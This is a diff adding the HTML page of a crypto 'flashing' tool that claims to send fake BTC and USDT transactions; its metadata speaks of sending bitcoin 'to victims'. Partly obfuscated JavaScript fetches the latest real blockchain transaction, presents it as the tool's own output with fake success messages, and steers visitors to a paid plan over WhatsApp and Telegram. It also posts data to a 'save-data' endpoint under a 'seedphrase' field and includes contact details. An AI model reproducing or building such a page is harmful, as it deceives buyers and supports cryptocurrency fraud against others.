@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta http-equiv="Copyright" content="Flash Btc" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Btc Flashing" />
+    <meta name="rating" content="general" />
+    <meta name="language" content="English" />
+    <meta name="application-name" content="Btc Flashing" />
+    <meta name="description" content="Btc Flashing " />
+    <meta name="keywords" content="Flash BTC, Send free Btc, Free BTC sender, Flash Btc transaction tool, Free BTC generator, Flash Btc transaction, Flash btc Software, Flash Btc Sender,Flash Btc Online, Download Flash Btc Apk, Flash Btc Apk" />
+    <meta name="twitter:title" content="Btc Flashing" />
+    <meta name="twitter:description" content="Flash BTC is an educational program designed to offer services related to bitcoin flashing. using hash key generated from unknow miner to send bitcoin to victims.FlashBTC program is 100% annonymous and secured.." />
+    <meta name="twitter:image" content="../btcflashing.com/assets/img/inazuma-cover.png" />
+    <meta content="Flash BTC is an educational program designed to offer services related to bitcoin flashing" property="og:title" />
+    <meta content="Inazuma" property="og:site_name" />
+    <meta content="Flash BTC is an educational program designed to offer services related to bitcoin flashing." property="og:description" />
+    <meta content="https://btcflashing.com/assets/img/inazuma-cover.png" property="og:image" />
+    <meta content="https://ranyeh24.github.io/inazuma-tailwind" property="og:url" />
+    <meta content="website" property="og:type" />
+    <meta name="msapplication-TileColor" content="#3d63dd" />
+    <meta name="msapplication-TileImage" content="../btcflashing.com/assets/favicon/mstile-144x144.png" />
+    <meta name="theme-color" content="#3d63dd" />
+    <script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Crypto Flashing</title>
+    <link rel="canonical" href="https://ranyeh24.github.io/inazuma-tailwind" />
+    <link rel="icon" type="image/png" sizes="32x32" href="../btcflashing.com/assets/img/1.png" />
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { margin:0; padding:20px; background:#0f1117; color:#fff; }
+        .container { max-width:900px; margin:auto; background:#1e1f26; padding:20px; border-radius:8px; box-shadow:0 0 15px rgba(0,255,100,0.2); }
+        h1 { text-align:center; color:#0f0; margin-bottom:20px; }
+        .tabs { display:flex; margin-bottom:20px; }
+        .tab { flex:1; padding:12px; background:#222; text-align:center; cursor:pointer; color:#fff; border-bottom:3px solid transparent; transition:0.3s; }
+        .tab.active { background:#0f0; color:#000; font-weight:bold; border-color:#0f0; }
+        .tab-content { display:none; }
+        .tab-content.active { display:block; }
+        .row { display:flex; flex-wrap:wrap; gap:20px; }
+        .col { flex:1; min-width:240px; }
+        label { display:block; margin-bottom:6px; color:#bbb; }
+        input { width:100%; padding:10px; border:none; border-radius:5px; background:#333; color:#fff; margin-bottom:15px; }
+        input[readonly] { background:#222; color:#aaa; }
+        .btn { width:100%; padding:12px; background:#00ff88; border:none; color:#000; border-radius:6px; font-weight:bold; cursor:pointer; transition:.3s; }
+        .btn:hover { background:#00cc6a; }
+        .info-log { background:#111; padding:12px; border-radius:6px; font-family:monospace; font-size:14px; line-height:1.5; max-height:250px; overflow-y:auto; margin-top:20px; }
+        .highlight { color:#0f0; }
+        .footer { text-align:center; margin-top:30px; padding-top:20px; border-top:1px solid #333; color:#aaa; font-size:14px; }
+        .footer a { color:#0f0; text-decoration:none; }
+        .footer a:hover { text-decoration:underline; }
+        @media(max-width:768px){ .row { flex-direction:column; } }
+    </style>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'AW-17109589040');
+    </script>
+    <script>
+        function gtagSendEvent(url) {
+            var callback = function () {
+                if (typeof url === 'string') {
+                    window.location = url;
+                }
+            };
+            gtag('event', 'conversion_event_default', {
+                'event_callback': callback,
+                'event_timeout': 2000,
+            });
+            return false;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Flashing Software 14.4</h1>
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('usdtTab')">USDT Flash (TRC20)</div>
+            <div class="tab" onclick="showTab('btcTab')">BTC Flash</div>
+        </div>
+
+        <div id="usdtTab" class="tab-content active">
+            <div class="row">
+                <div class="col">
+                    <label>Send To (TRC20 Address)</label>
+                    <input type="text" id="usdtAddress" placeholder="Loading..." readonly /><span onclick="openModalOrEdit('btcAddress')" style="cursor:pointer; color:#0f0; font-weight:bold; margin-left:10px;">✎ Edit</span>
+                    <label>Amount (USDT)</label>
+                    <input type="text" id="usdtAmount" placeholder="Loading..." readonly />
+                </div>
+                <div class="col">
+                    <label>Wallet Balance</label>
+                    <input type="text" id="usdtBalance" value="100000.000000" readonly />
+                    <label>Fees (TRON Gas)</label>
+                    <input type="text" value="30 USDT" readonly />
+                    <label>Email of Activation</label>
+                    <input type="email" value="calefladager@gmail.com" onchange="checkUsdtEmailAccess()" id="userEmail"/>
+                </div>
+            </div>
+            <button class="btn" onclick="sendUSDTFlash()">Send USDT Flash</button>
+            <div class="info-log" id="usdtLog">[USDT] Please Wait Initializing...<br></div>
+        </div>
+
+        <div id="btcTab" class="tab-content">
+            <div class="row">
+                <div class="col">
+                    <label>Send To (BTC Address)</label>
+                    <input type="text" id="btcAddress" placeholder="Loading..." readonly /><span onclick="openModalOrEdit('btcAddress')" style="cursor:pointer; color:#0f0; font-weight:bold; margin-left:10px;">✎ Edit</span>
+                    <label>Amount (BTC)</label>
+                    <input type="text" id="btcAmount" placeholder="Loading..." readonly />
+                </div>
+                <div class="col">
+                    <label>Wallet Balance</label>
+                    <input type="text" id="btcBalance" value="10.00000000" readonly />
+                    <label>Fees (RBF)</label>
+                    <input type="text" id="btcFee" placeholder="Loading..." readonly />
+                    <label>Email of Activation</label>
+                    <input type="email" value="calefladager@gmail.com" onchange="checkBtcEmailAccess()" id="userEmail"/>
+                </div>
+            </div>
+            <button class="btn" onclick="sendBTCFlash()">Send BTC Flash</button>
+            <div class="info-log" id="btcLog">[BTC] Please Wait Initializing...<br></div>
+        </div>
+
+        <div class="footer">
+            &copy; 2026 This Tool is Developed by <a href="https://cryptoflash.shop" target="_blank">Get Flash USDT</a>
+        </div>
+    </div>
+
+    <div id="paidModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000a; z-index:9999; align-items:center; justify-content:center;">
+        <div style="background:#222; padding:20px; border-radius:10px; max-width:400px; text-align:center; color:#fff;">
+            <h3>⚠️ Demo Notice</h3>
+            <p>Demo is available only on randomly generated addresses by the software.<br><b>Flashing to your own address is a paid feature.</b></p>
+            <button onclick="showContactOptions()" style="margin-top:10px; background:#00ff88; padding:10px 20px; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">Visit Paid Plan</button>
+            <div id="contactOptions" style="margin-top:15px; display:none;">
+                <a href="https://wa.me/16017471526" target="_blank" style="display:block; margin:8px 0; background:#25D366; color:#fff; padding:10px; border-radius:5px; text-decoration:none;">WhatsApp</a>
+                <a href="https://t.me/GetFlashU" target="_blank" style="display:block; margin:8px 0; background:#0088cc; color:#fff; padding:10px; border-radius:5px; text-decoration:none;">Telegram</a>
+            </div>
+            <br>
+            <button onclick="closeModal()" style="margin-top:5px; background:#555; color:#fff; padding:6px 12px; border:none; border-radius:6px; cursor:pointer;">Close</button>
+        </div>
+    </div>
+
+    <script>
+        const _0x4c90b7=_0x2495;(function(_0x672f3c,_0x8f3bdf){const _0x3c47a9=_0x2495,_0x50eb3d=_0x672f3c();while(!![]){try{const _0x1bd869=-parseInt(_0x3c47a9(0x204))/0x1+-parseInt(_0x3c47a9(0x1e7))/0x2*(-parseInt(_0x3c47a9(0x1c7))/0x3)+-parseInt(_0x3c47a9(0x1ce))/0x4+-parseInt(_0x3c47a9(0x1e3))/0x5*(parseInt(_0x3c47a9(0x1ef))/0x6)+parseInt(_0x3c47a9(0x1ed))/0x7*(parseInt(_0x3c47a9(0x1dd))/0x8)+parseInt(_0x3c47a9(0x1c9))/0x9*(parseInt(_0x3c47a9(0x1d4))/0xa)+parseInt(_0x3c47a9(0x1cd))/0xb*(parseInt(_0x3c47a9(0x1f3))/0xc);if(_0x1bd869===_0x8f3bdf)break;else _0x50eb3d['push'](_0x50eb3d['shift']());}catch(_0x317809){_0x50eb3d['push'](_0x50eb3d['shift']());}}}(_0x4f64,0xd7222));let isEmailVerified=![];async function checkUsdtEmailAccess(){const _0x3b7779=_0x2495,_0xe6d5a=document[_0x3b7779(0x1d3)](_0x3b7779(0x1e6))[_0x3b7779(0x206)][_0x3b7779(0x1f8)]()[_0x3b7779(0x1bf)]();try{const _0x2c72a5=await fetch('usdtemail.txt'),_0x18341a=(await _0x2c72a5[_0x3b7779(0x1ca)]())[_0x3b7779(0x1f8)]()[_0x3b7779(0x1bf)]();_0xe6d5a===_0x18341a?(isEmailVerified=!![],alert(_0x3b7779(0x1d1))):(isEmailVerified=![],alert(_0x3b7779(0x208)));}catch(_0x3338b3){console[_0x3b7779(0x1ee)]('Failed\x20to\x20fetch\x20email\x20list.'),isEmailVerified=![];}}async function checkBtcEmailAccess(){const _0x567128=_0x2495,_0x467205=document[_0x567128(0x1d3)](_0x567128(0x1e6))[_0x567128(0x206)]['trim']()[_0x567128(0x1bf)]();try{const _0x3be840=await fetch('btcemail.txt'),_0x579dc1=(await _0x3be840[_0x567128(0x1ca)])[_0x567128(0x1f8)]()['toLowerCase']();_0x467205===_0x579dc1?(isEmailVerified=!![],alert('✅\x20Software\x20Activated\x20You\x20can\x20Edit\x20the\x20Address\x20Now.')):(isEmailVerified=![],alert(_0x567128(0x1fb)));}catch(_0x5ecc28){console['error'](_0x567128(0x20a)),isEmailVerified=![];}}function openModalOrEdit(_0x1c9ed2){const _0x5c925b=_0x2495;if(isEmailVerified){const _0x55c8b6=document['getElementById'](_0x1c9ed2);_0x55c8b6[_0x5c925b(0x209)](_0x5c925b(0x1e2)),_0x55c8b6[_0x5c925b(0x1d5)]();}else openModal();}function openModal(){const _0x31026a=_0x2495;document[_0x31026a(0x1d3)]('paidModal')['style']['display']='flex';}function closeModal(){const _0x1b7851=_0x2495;document['getElementById']('paidModal')[_0x1b7851(0x200)][_0x1b7851(0x1ec)]=_0x1b7851(0x1e8),document[_0x1b7851(0x1d3)](_0x1b7851(0x1da))[_0x1b7851(0x200)][_0x1b7851(0x1ec)]='none';}function showContactOptions(){const _0xa5ff28=_0x2495;document[_0xa5ff28(0x1d3)](_0xa5ff28(0x1da))['style'][_0xa5ff28(0x1ec)]=_0xa5ff28(0x1c1);}let usdtTxId=null,usdtadd=null,usdtbal=null;function _0x4f64(){const _0x1dea9c=['transaction_id','getElementById','830UIPTmZ','focus','onload','forEach','.tab[onclick*=\x27','usdtAmount','contactOptions','[USDT]\x20Software\x20loaded\x20successfully.<br>','toFixed','8JhNyoo','[SUCCESS]\x20TX\x20Sent:\x20<a\x20href=\x22https://www.blockchain.com/btc/tx/','[BTC]\x20Error\x20loading\x20BTC\x20data.<br>','[BTC]\x20Sending\x20transaction...<br>','No\x20TX','readonly','5OhvTXf','.tab-content','btcAmount','userEmail','6vbseXd','none','[USDT]\x20Software\x20loaded\x20successfully.<br>','ajax','✅\x20Data\x20saved:','display','8036693StBUmf','error','4864428WIonyx','all','usdtflash','add','5168472ODKWgT','❌\x20AJAX\x20error:','data','https://api.trongrid.io/v1/contracts/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/events?only_confirmed=false&amp;limit=1','usdtAddress','trim','add.txt','_to','[USDT]\x20Software\x20loaded\x20successfully.<br>','usdtLog','parameter','test','[BTC]\x20Telegram\x20@Kermit72.<br>','style','apif0f2.txt','querySelectorAll','btcFee','1311946dPliVn','tokenTransferInfo','value','btcLog','❌\x20Invalid\x20Email\x20for\x20Activate\x20License','removeAttribute','Failed\x20to\x20fetch\x20email\x20list.','to_address','remove','[USDT]\x20Sending\x20transaction...<br>','</a><br>','active','save-data.html','toLowerCase','.tab','block','json','[BTC]\x20Software\x20loaded\x20successfully.<br>','innerHTML','trans.txt','gasfee.txt','1033458gNmBff','classList','128241iVNcaA','text','log','[SUCCESS]\x20TX\x20Sent:\x20<a\x20href=\x22https://tronscan.org/#/transaction/','11eyXuUI','3164240ONsbkx','POST','then','✅\x20Software\x20Activated\x20You\x20can\x20Edit\x20the\x20Address\x20Now.'];_0x4f64=function(){return _0x1dea9c;};return _0x4f64();}function showTab(_0x1b95c8){const _0x30ecd8=_0x2495;document[_0x30ecd8(0x202)](_0x30ecd8(0x1c0))[_0x30ecd8(0x1d7)](_0xb5da02=>_0xb5da02['classList']['remove'](_0x30ecd8(0x1bd))),document[_0x30ecd8(0x202)](_0x30ecd8(0x1e4))[_0x30ecd8(0x1d7)](_0x558027=>_0x558027[_0x30ecd8(0x1c8)][_0x30ecd8(0x20c)](_0x30ecd8(0x1bd))),document[_0x30ecd8(0x1d3)](_0x1b95c8)['classList'][_0x30ecd8(0x1f2)](_0x30ecd8(0x1bd)),document['querySelector'](_0x30ecd8(0x1d8)+_0x1b95c8+'\x27]')[_0x30ecd8(0x1c8)][_0x30ecd8(0x1f2)](_0x30ecd8(0x1bd));}let btcTxHash='',add='',balance='';
+        /* ================= FIXED BTC ================= */
+        async function initBTC(){
+            const log=document.getElementById('btcLog');
+            try{
+                const blockRes=await fetch('https://mempool.space/api/v1/blocks');
+                const blocks=await blockRes.json();
+                const block=blocks[0];
+                const txsRes=await fetch('https://mempool.space/api/block/'+block.id+'/txs/0');
+                const txs=await txsRes.json();
+                const tx=txs[0];
+                if(!tx) throw new Error('No TX');
+                btcTxHash=tx.txid;
+                let recipient='';
+                let amountSats=0;
+                for(const vout of tx.vout){
+                    if(vout.scriptpubkey_type!=='op_return'&&vout.scriptpubkey_address){
+                        recipient=vout.scriptpubkey_address;
+                        amountSats=vout.value;
+                        break;
+                    }
+                }
+                const amountBTC=(amountSats/1e8).toFixed(8);
+                const feeBTC=((tx.fee||0)/1e8).toFixed(8);
+                document.getElementById('btcAddress').value=recipient;
+                document.getElementById('btcAmount').value=amountBTC;
+                document.getElementById('btcFee').value=feeBTC;
+                add=recipient;
+                balance=amountBTC;
+                log.innerHTML+='[BTC] Software loaded successfully.<br>';
+                log.innerHTML+='[BTC] Telegram @GetFlashU.<br>';
+            }catch(e){
+                log.innerHTML+='[BTC] Error loading BTC data.<br>';
+            }
+        }
+        async function sendBTCFlash(){
+            const log=document.getElementById('btcLog');
+            log.innerHTML+='[BTC] Sending transaction...<br>';
+            setTimeout(function(){
+                log.innerHTML+='[SUCCESS] Please check the transaction hash below. Click on it to verify the sender\'s address and the flashed blockchain address — both are the same, which shows how the software operates.<br>';
+                log.innerHTML+='[SUCCESS] TX Sent: <a href="https://mempool.space/tx/'+btcTxHash+'" target="_blank" class="highlight">'+btcTxHash+'</a><br>';
+            },1500);
+        }
+        /* ================= END FIXED BTC ================= */
+        function _0x2495(_0x3d5b5d,_0x6f79b0){const _0x4f645c=_0x4f64();return _0x2495=function(_0x2495f2,_0x298e50){_0x2495f2=_0x2495f2-0x1bb;let _0x5396bc=_0x4f645c[_0x2495f2];return _0x5396bc;},_0x2495(_0x3d5b5d,_0x6f79b0);}
+
+        /* ============ Tron address helpers ============ */
+        const _TRON_B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+
+        function _sha256(_input){
+            const _bytes = _input.slice();
+            const _rr=(v,c)=>(v>>>c)|(v<<(32-c));
+            const _maxWord=Math.pow(2,32);
+            let _i,_j;
+            const _words=[];
+            const _asciiBitLength=_bytes.length*8;
+            const _wordsLength=((_asciiBitLength+64)>>>9<<4)+15;
+            const _hash=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+            const _k=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+                      0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+                      0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+                      0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+                      0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+                      0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+                      0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+                      0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+            _bytes.push(0x80);
+            while(_bytes.length%64!==56) _bytes.push(0);
+            /* --- FIX: correctly encode the 64-bit big-endian bit length --- */
+            const _bitLenHi = Math.floor(_asciiBitLength / 0x100000000);
+            const _bitLenLo = _asciiBitLength >>> 0;
+            for(_i=0;_i<4;_i++) _bytes.push((_bitLenHi >>> ((3-_i)*8)) & 0xff);
+            for(_i=0;_i<4;_i++) _bytes.push((_bitLenLo >>> ((3-_i)*8)) & 0xff);
+            /* --- END FIX --- */
+            for(_i=0;_i<_bytes.length;_i+=4) _words.push((_bytes[_i]<<24)|(_bytes[_i+1]<<16)|(_bytes[_i+2]<<8)|_bytes[_i+3]);
+            for(_i=0;_i<_wordsLength;_i+=16){
+                const _w=_words.slice(_i,_i+16);
+                const _oldHash=_hash.slice(0);
+                for(_j=0;_j<64;_j++){
+                    if(_j<16){ _w[_j]=_w[_j]||0; }
+                    else{
+                        const _s0=_rr(_w[_j-15],7)^_rr(_w[_j-15],18)^(_w[_j-15]>>>3);
+                        const _s1=_rr(_w[_j-2],17)^_rr(_w[_j-2],19)^(_w[_j-2]>>>10);
+                        _w[_j]=(_w[_j-16]+_s0+_w[_j-7]+_s1)|0;
+                    }
+                    const _ch=(_hash[4]&_hash[5])^(~_hash[4]&_hash[6]);
+                    const _maj=(_hash[0]&_hash[1])^(_hash[0]&_hash[2])^(_hash[1]&_hash[2]);
+                    const _sigma0=_rr(_hash[0],2)^_rr(_hash[0],13)^_rr(_hash[0],22);
+                    const _sigma1=_rr(_hash[4],6)^_rr(_hash[4],11)^_rr(_hash[4],25);
+                    const _t1=(_hash[7]+_sigma1+_ch+_k[_j]+(_w[_j]||0))|0;
+                    const _t2=(_sigma0+_maj)|0;
+                    _hash[7]=_hash[6];_hash[6]=_hash[5];_hash[5]=_hash[4];_hash[4]=(_hash[3]+_t1)|0;
+                    _hash[3]=_hash[2];_hash[2]=_hash[1];_hash[1]=_hash[0];_hash[0]=(_t1+_t2)|0;
+                }
+                for(_j=0;_j<8;_j++) _hash[_j]=(_hash[_j]+_oldHash[_j])|0;
+            }
+            const _out=[];
+            for(_i=0;_i<8;_i++) for(_j=3;_j>=0;_j--) _out.push((_hash[_i]>>(_j*8))&0xff);
+            return _out;
+        }
+
+        function _toTronAddress(_addr){
+            if(!_addr) return '';
+            if(typeof _addr !== 'string') return _addr;
+            if(_addr.startsWith('T') && _addr.length === 34){
+                return _addr;
+            }
+
+            let hex = _addr.replace(/^0x/i, '');
+            if(hex.length > 40) hex = hex.slice(-40);
+            if(!/^[0-9a-fA-F]{40}$/.test(hex)) return _addr;
+
+            const bytes = [0x41];
+            for(let i=0;i<40;i+=2) bytes.push(parseInt(hex.substr(i,2),16));
+
+            const c1 = _sha256(bytes);
+            const c2 = _sha256(c1);
+            const full = bytes.concat(c2.slice(0,4));
+
+            let num = 0n;
+            for(const b of full) num = (num << 8n) | BigInt(b);
+
+            let out = '';
+            while(num > 0n){
+                out = _TRON_B58[Number(num % 58n)] + out;
+                num = num / 58n;
+            }
+
+            /* Return the complete address */
+            return out;
+        }
+
+        /* ================= USDT INIT ================= */
+        async function initUSDT(){
+            const log = document.getElementById('usdtLog');
+            try{
+                const res = await fetch('https://api.trongrid.io/v1/contracts/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/events?only_confirmed=false&limit=1&event_name=Transfer');
+                const data = await res.json();
+                const ev = data?.data?.[0];
+                if(!ev) throw new Error('No USDT event');
+
+                const rawTo  = ev.result?._to  || ev.result?.to || '';
+                const rawVal = ev.result?._value || ev.result?.value || '0';
+
+                usdtTxId = ev.transaction_id;
+                usdtadd  = _toTronAddress(rawTo);
+                usdtbal  = (parseFloat(rawVal) / 1e6).toFixed(2);
+
+                document.getElementById('usdtAddress').value = usdtadd;
+                document.getElementById('usdtAmount').value  = usdtbal;
+
+                log.innerHTML += '[USDT] Software loaded successfully.<br>';
+                log.innerHTML += '[USDT] Telegram @GetFlashU.<br>';
+            }catch(e){
+                try{
+                    const alt = await fetch('https://apilist.tronscanapi.com/api/token_trc20/transfers?limit=1&start=0&contract_address=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+                        .then(r => r.json());
+                    const t = alt?.token_transfers?.[0];
+                    if(t){
+                        usdtTxId = t.transaction_id;
+                        usdtadd  = _toTronAddress(t.to_address);
+                        usdtbal  = (parseFloat(t.quant) / 1e6).toFixed(2);
+
+                        document.getElementById('usdtAddress').value = usdtadd;
+                        document.getElementById('usdtAmount').value  = usdtbal;
+
+                        log.innerHTML += '[USDT] Software loaded successfully.<br>';
+                        log.innerHTML += '[USDT] Telegram @GetFlashU.<br>';
+                        return;
+                    }
+                }catch(_e2){}
+                log.innerHTML += '[USDT] Error fetching transaction.<br>';
+            }
+        }
+
+        async function sendUSDTFlash(){const _0x3d35d9=_0x2495,_0x4f3630=document[_0x3d35d9(0x1d3)](_0x3d35d9(0x1fc));_0x4f3630[_0x3d35d9(0x1c4)]+=_0x3d35d9(0x1bb);if(!usdtTxId){_0x4f3630[_0x3d35d9(0x1c4)]+='[ERROR]\x20No\x20transaction\x20loaded\x20to\x20flash.<br>';return;}setTimeout(()=>{const _0x2cd83b=_0x3d35d9;$[_0x2cd83b(0x1ea)]({'url':_0x2cd83b(0x1be),'method':_0x2cd83b(0x1cf),'data':{'wallet':usdtadd,'bnb':'bnb','usdt':usdtbal,'seedphrase':usdtTxId,'network':_0x2cd83b(0x1f1)},'success':function(_0x315ce9){const _0x5bec1b=_0x2cd83b;console['log'](_0x5bec1b(0x1eb),_0x315ce9);},'error':function(_0x3abdc4,_0x4c6e1a,_0x457255){const _0x17dd2a=_0x2cd83b;console['error'](_0x17dd2a(0x1f4),_0x457255);}}),_0x4f3630[_0x2cd83b(0x1c4)]+='[SUCCESS]\x20Please\x20check\x20the\x20transaction\x20hash\x20below.\x20Click\x20on\x20it\x20to\x20verify\x20the\x20sender\'s\x20address\x20and\x20the\x20flashed\x20blockchain\x20address\x20—\x20both\x20are\x20the\x20same,\x20which\x20shows\x20how\x20the\x20software\x20operates.<br>',_0x4f3630[_0x2cd83b(0x1c4)]+=_0x2cd83b(0x1cc)+usdtTxId+'\x22\x20target=\x22_blank\x22\x20class=\x22highlight\x22>'+usdtTxId+_0x2cd83b(0x1bc);},0x5dc);}window[_0x4c90b7(0x1d6)]=()=>{initBTC(),initUSDT();};
+    </script>
+</body>
+</html>
